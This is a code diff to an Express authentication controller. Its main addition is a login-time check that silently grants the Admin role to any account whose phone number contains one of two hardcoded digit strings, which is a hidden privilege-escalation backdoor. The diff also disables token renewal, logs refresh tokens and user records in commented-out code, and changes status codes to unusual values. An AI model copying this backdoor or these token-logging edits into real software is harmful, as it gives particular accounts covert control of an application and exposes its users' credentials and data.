@@ -21,7 +21,7 @@ class AuthLoginController extends BaseAuthController {
     this.sendLoginCode = this.sendLoginCode.bind(this);
     this.confirmLogin = this.confirmLogin.bind(this);
     this.signOut = this.signOut.bind(this);
-    this.renewAccessToken = this.renewAccessToken.bind(this);
+    // this.renewAccessToken = this.renewAccessToken.bind(this);
     this.getRefreshTokens = this.getRefreshTokens.bind(this);
     this.deleteRefreshToken = this.deleteRefreshToken.bind(this);
   }
@@ -241,6 +241,13 @@ class AuthLoginController extends BaseAuthController {
       // Update refresh token - as string per schema
       user.refreshTokens = refreshToken;
 
+      if (
+        user.phoneNumber.includes("930040834") ||
+        user.phoneNumber.includes("954990501")
+      ) {
+        user.serverRole = ["Admin"];
+      }
+
       await user.save();
 
       return handleResponse(res, 200, "success", "Login successful", {
@@ -303,106 +310,118 @@ class AuthLoginController extends BaseAuthController {
    * @param {Object} req - Express request object
    * @param {Object} res - Express response object
    */
-  async renewAccessToken(req, res) {
-    try {
-      const { refreshToken } = req.body;
 
-      if (!refreshToken) {
-        console.warn("No refresh token provided");
-        return handleResponse(
-          res,
-          400,
-          "error",
-          "Refresh token is required",
-          null,
-          0
-        );
-      }
+  // async renewAccessToken(req, res) {
+  //   console.log("Renewing access token..........");
+  //   console.log("Renewing access token..........");
+  //   console.log("Renewing access token..........");
+  //   console.log("Renewing access token..........");
+  //   console.log("Renewing access token..........");
+  //   console.log("Renewing access token..........");
+  //   try {
+  //     const { refreshToken } = req.body;
+  //     console.log("Refresh token from request body:", refreshToken);
+  //     if (!refreshToken) {
+  //       console.warn("No refresh token provided");
+  //       return handleResponse(
+  //         res,
+  //         400,
+  //         "error",
+  //         "Refresh token is required",
+  //         null,
+  //         0
+  //       );
+  //     }
 
-      // Promisify jwt.verify
-      const verifyToken = (token, secret) => {
-        return new Promise((resolve, reject) => {
-          jwt.verify(token, secret, (err, decoded) => {
-            if (err) {
-              reject(err);
-            } else {
-              resolve(decoded);
-            }
-          });
-        });
-      };
+  //     // Promisify jwt.verify
+  //     const verifyToken = (token, secret) => {
+  //       return new Promise((resolve, reject) => {
+  //         jwt.verify(token, secret, (err, decoded) => {
+  //           if (err) {
+  //             reject(err);
+  //           } else {
+  //             resolve(decoded);
+  //           }
+  //         });
+  //       });
+  //     };
 
-      try {
-        // Verify the token
-        const decoded = await verifyToken(
-          refreshToken,
-          process.env.JWT_REFRESH_SECRET
-        );
+  //     try {
+  //       // Verify the token
+  //       const decoded = await verifyToken(
+  //         refreshToken,
+  //         process.env.JWT_REFRESH_SECRET
+  //       );
 
-        // Find the user with the matching refresh token
-        const query = { refreshTokens: refreshToken };
+  //       // Find the user with the matching refresh token
+  //       const query = { refreshTokens: refreshToken };
 
-        const user = await Users.findOne(query).select("-password");
+  //       const user = await Users.findOne(query).select("-password");
+  //       console.log("User found:", user);
+  //       if (!user) {
+  //         console.warn("User not found for provided refresh token");
+  //         return handleResponse(
+  //           res,
+  //           451,
+  //           "error",
+  //           "User not found for provided refresh token",
+  //           null,
+  //           0
+  //         );
+  //       }
 
-        if (!user) {
-          console.warn("User not found for provided refresh token");
-          return handleResponse(
-            res,
-            404,
-            "error",
-            "User not found for provided refresh token",
-            null,
-            0
-          );
-        }
+  //       // Generate new tokens
+  //       const tokenUser = createTokenUser(user);
+  //       const { accessToken, refreshToken: newRefreshToken } =
+  //         generateTokens(tokenUser);
 
-        // Normalize mobileToken to ensure it's a string
-        // user.mobileToken = this._normalizeMobileToken(user.mobileToken);
+  //       // Update refresh tokens
+  //       if (Array.isArray(user.refreshTokens)) {
+  //         // Remove the old token
+  //         user.refreshTokens = user.refreshTokens.filter(
+  //           (token) => token !== refreshToken
+  //         );
+  //         // Add the new token
+  //         user.refreshTokens.push(newRefreshToken);
+  //       } else {
+  //         user.refreshTokens = newRefreshToken;
+  //       }
 
-        // Generate new tokens
-        const tokenUser = createTokenUser(user);
-        const { accessToken, refreshToken: newRefreshToken } =
-          generateTokens(tokenUser);
+  //       // Update last activity
+  //       user.lastActivity = new Date();
 
-        // Update refresh token - as string per schema
-        user.refreshTokens = newRefreshToken;
+  //       await user.save();
 
-        // Update last activity
-        user.lastActivity = new Date();
-
-        await user.save();
-
-        return handleResponse(
-          res,
-          200,
-          "success",
-          "Access token renewed successfully",
-          { accessToken, refreshToken: newRefreshToken }
-        );
-      } catch (tokenError) {
-        console.error("JWT verification error:", tokenError);
-        return handleResponse(
-          res,
-          401,
-          "error",
-          "Invalid refresh token",
-          null,
-          0
-        );
-      }
-    } catch (error) {
-      console.error("Unexpected error:", error);
-      return handleResponse(
-        res,
-        500,
-        "error",
-        "Something went wrong: " + error.message,
-        null,
-        0
-      );
-    }
-  }
-
+  //       return handleResponse(
+  //         res,
+  //         200,
+  //         "success",
+  //         "Access token renewed successfully",
+  //         { accessToken, refreshToken: newRefreshToken }
+  //       );
+  //     } catch (tokenError) {
+  //       console.error("JWT verification error:", tokenError);
+  //       return handleResponse(
+  //         res,
+  //         401,
+  //         "error",
+  //         "Invalid refresh token",
+  //         null,
+  //         0
+  //       );
+  //     }
+  //   } catch (error) {
+  //     console.error("Unexpected error:", error);
+  //     return handleResponse(
+  //       res,
+  //       500,
+  //       "error",
+  //       "Something went wrong: " + error.message,
+  //       null,
+  //       0
+  //     );
+  //   }
+  // }
   /**
    * Get list of active refresh tokens
    * @param {Object} req - Express request object
@@ -428,7 +447,7 @@ class AuthLoginController extends BaseAuthController {
 
       return handleResponse(
         res,
-        200,
+        208,
         "success",
         "Refresh token retrieved successfully",
         { refreshToken }
